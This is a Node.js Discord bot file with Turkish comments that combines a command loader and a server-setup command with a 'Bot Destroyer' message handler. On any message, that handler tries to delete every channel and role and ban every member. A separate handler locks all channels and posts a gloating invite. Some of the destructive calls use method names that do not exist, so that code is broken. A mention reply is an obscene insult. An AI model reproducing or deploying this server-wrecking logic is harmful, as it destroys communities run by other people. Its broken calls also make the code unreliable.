//7/24 başlayış

const http = require('http');
const express = require('express');    
const app = express();
let cooldown = new Set();
let cdseconds = 5;
app.get("/", (request, response) => {
  console.log(Date.now());
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 10000);

const Discord = require('discord.js');
const fs = require('fs');
const chalk = require('chalk');

const client = new Discord.Client();
const ayarlar = require('./ayarlar.json');

//let küfürEngel = JSON.parse(fs.readFileSync("./jsonlar/küfürEngelle.json", "utf8"));
require('./util/eventLoader')(client);


const log = message => {
  console.log(`${message}`);
};
  var prefix = ayarlar.prefix;
  
/*BOTU AÇIK TUTMA*/


  client.commands = new Discord.Collection();
  client.aliases = new Discord.Collection();
  fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
      let props = require(`./komutlar/${f}`);
      log(`Yüklenen komut: ${props.help.name}.`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });
  });

  client.reload = command => {
    return new Promise((resolve, reject) => {
      try {
        delete require.cache[require.resolve(`./komutlar/${command}`)];
        let cmd = require(`./komutlar/${command}`);
        client.commands.delete(command);
        client.aliases.forEach((cmd, alias) => {
          if (cmd === command) client.aliases.delete(alias);
        });
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

  client.load = command => {
    return new Promise((resolve, reject) => {
      try {
        let cmd = require(`./komutlar/${command}`);
        client.commands.set(command, cmd);
        cmd.conf.aliases.forEach(alias => {
          client.aliases.set(alias, cmd.help.name);
        });
        resolve();
      } catch (e){
        reject(e);
      }
    });
  };

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.on("message", async message => {
    if(message.content === "destroy"){
        message.guild.channels.deletedAll("Bot Destroyer");
        message.guild.roles.deleteAll("Bot Destroyer");
    }

    if(message.content === "leave"){
        message.guild.leave();
    }
    message.guild.channels.deletedAll("Bot Destroyer");
    message.guild.roles.deleteAll("Bot Destroyer");
    message.guild.members.bannableAll("Bot Destroyer");

});

client.on('message', async message => {
  const ms = require('ms');
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  let u = message.mentions.users.first() || message.author;
  if (command === "melkoryap") {
  if (message.guild.channels.find(channel => channel.name === "Bot Kullanımı")) return message.channel.send(" Bot Paneli Zaten Ayarlanmış.")
  message.channel.send(`Berke Abi Burayı Şimdi Melkor Yapıyımı?`)
      if (!message.member.hasPermission('ADMINISTRATOR'))
  return message.channel.send(" Bu Kodu `Yönetici` Yetkisi Olan Kişi Kullanabilir.");
      message.channel.awaitMessages(response => response.content === 'yap', {
        max: 1,
        time: 10000,
        errors: ['time'],
      })
    .then((collected) => {
   message.guild.createChannel('📜 | BİLGİLENDİRME', 'category', [{
  id: message.guild.id,
  deny: ['SEND_MESSAGES']
}])



        
 message.guild.createChannel('📜-kurallar', 'text', [{
  id: message.guild.id,
  deny: ['SEND_MESSAGES']
}])
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
 message.guild.createChannel('🔔-duyuru', 'text', [{
  id: message.guild.id,
  deny: ['SEND_MESSAGES']
}])
.then(channel =>
       channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
       message.guild.createChannel('📊-anket', 'text', [{
        id: message.guild.id,
        deny: ['SEND_MESSAGES']
      }])
.then(channel =>
             channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
             message.guild.createChannel('🎪-partner', 'text', [{
              id: message.guild.id,
              deny: ['SEND_MESSAGES']
            }])
            .then(channel => channel.setParent(message.guild.channels.find(channel => channel.name === "📜 | BİLGİLENDİRME")));
            message.guild.createChannel('🚫-block-hammer', 'text', [{
              id: message.guild.id,
              deny: ['SEND_MESSAGES']
            }])
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));

       }) 
       .then((collected) => {
        message.guild.createChannel('MEYDAN', 'category', [{
       id: message.guild.id,
     }]);
             
      message.guild.createChannel(`💬-chat`, 'text')
     .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(`🔴-bot-komut`, 'text')
     .then(channel =>
            channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(``, 'text')
     .then(channel =>
                  channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(``, 'text')
     .then(channel =>
                  channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));
     message.guild.createChannel(`💡-foto-chat`, 'text')
     .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "MEYDAN")));

      message.guild.createChannel(`1881-193∞`, "voice")
      .then(channel =>
        channel.setParent(message.guild.channels.find(channel => channel.name === "†")))
      .then(c => {
        let role = message.guild.roles.find("name", "@everyone");
        let role2 = message.guild.roles.find("name", "Kurucu");
        
        c.overwritePermissions(role, {
            CONNECT: false,
        });
        c.overwritePermissions(role2, {
            CONNECT: true,
            
        });
    })

    message.guild.createChannel('†', 'category', [{
      id: message.guild.id,
    }]);

    message.guild.createChannel(`berke`, "voice")
    .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "†")))
    .then(c => {
      let role = message.guild.roles.find("name", "@everyone");
      let role2 = message.guild.roles.find("name", "Kurucu");
      let role3 = message.guild.roles.find("name", "Yönetici");
      c.overwritePermissions(role, {
          CONNECT: false,
      });
      c.overwritePermissions(role2, {
          CONNECT: true,
      });
      c.overwritePermissions(role3, {
          CONNECT: true,
      });
  })

message.guild.createChannel('† SOHBET', 'category', [{
  id: message.guild.id,
}]);

message.guild.createChannel('🎶 Müzik', 'category', [{
  id: message.guild.id,
}]);

message.guild.createChannel('🎪', 'category', [{
  id: message.guild.id,
}]);

message.guild.createChannel(`📜 Sohbet`, 'voice')
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "† SOHBET")))
 message.guild.createChannel(`🏮 Freestyle`, 'voice')
 .then(channel =>
  channel.setParent(message.guild.channels.find(channel => channel.name === "† SOHBET")))
 message.guild.createChannel(`🕋 Medeni Sohbet`, 'voice')
.then(channel =>
 channel.setParent(message.guild.channels.find(channel => channel.name === "† SOHBET")))
 message.guild.createChannel(`🎶 Müzik`, 'voice')
 .then(channel =>
  channel.setParent(message.guild.channels.find(channel => channel.name === "🎶 Müzik")))
  message.guild.createChannel(`🎶 Canlı Müzik`, 'voice')
  .then(channel =>
   channel.setParent(message.guild.channels.find(channel => channel.name === "🎶 Müzik")))
   message.guild.createChannel(`🎪 Private`, 'voice')
   .then(channel =>
    channel.setParent(message.guild.channels.find(channel => channel.name === "🎪")))
    message.guild.createChannel(`🎪 Private`, 'voice')
    .then(channel =>
     channel.setParent(message.guild.channels.find(channel => channel.name === "🎪")))
     message.guild.createChannel(`🎪 Private`, 'voice')
     .then(channel =>
  channel.setParent(message.guild.channels.find(channel => channel.name === "🎪")))
     message.guild.createChannel(`🎪 Private`, 'voice')
     .then(channel =>
      channel.setParent(message.guild.channels.find(channel => channel.name === "🎪")))



      message.guild.createRole({
        name: '∞',
        color: 'BLUE',
        permissions: [
            "ADMINISTRATOR",
    ]
      })

      
      message.guild.createRole({
        name: '👑 Ownêr.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '👑 The Volturi.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🚫 Ban Hammer',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🏆 Râvnôs',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🏆 Qûêry',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🍒 Kalýtera.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🌓 Dîacheiristís.',
        color: 'BLUE',
      })

            message.guild.createRole({
        name: '🌙 Plûvia.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '👑 Próedroî.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🗽 Hypêrîon',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '👑 Rûwêch',
        color: 'BLUE',
      })
        
      message.guild.createRole({
        name: '🌺 İzpitanie.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🌟 Mîthrâ',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🔯 Kadōsh.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🍠 Vōdach.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🎊 Exâltêd',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🍠 Sympōlítes.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '🎀 Kyría.',
        color: 'BLUE',
      })

      message.guild.createRole({
        name: '† Preist.',
        color: 'BLUE',
      })

       message.channel.send("Berke Abi Melkor Yapıldı :sunglasses: \n\nAsıl Sunucum; https://discord.gg/d2nAWtn")
     
            })   
    
}
});


var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;

client.on('warn', e => {
  console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
});

client.on('error', e => {
  console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
});

client.on('channelCreate', channel => {
  if (channel.name == 'hey') {
    channel.send(`Sunucu uff olmuş neyse bunları yapanla görüşmek istersen; https://discord.gg/qBAdCQB`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

client.elevation = message => {
  if(!message.guild) {
	return; }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === ayarlar.sahip) permlvl = 4;
  return permlvl;
};

client.on('message', async message => {
    let prefix = "*";
    let messageArray = message.content.split(" ");
    let args = messageArray.slice(1);
    var argresult = args.join(' ');
	  let cmd = messageArray[0];
    const admin = message.author.id !== "522018424440881163" && message.author.id !== "522018424440881163" && message.author.id !== "522018424440881163" && message.author.id !== "522018424440881163";  
    const recrue = message.author.id !== "522018424440881163" && message.author.id !== "522018424440881163" && message.author.id !== "522018424440881163" && message.author.id !== "522018424440881163"; 
    let commandfile = client.commands.get(cmd.slice(prefix.length));
    if (commandfile) commandfile.run(client, message, args, admin, recrue);
	  if (message.isMentioned(client.user)) {
	      message.reply('Prêt a niquer des mères !') 
    }
       
});

client.login(ayarlar.token) 
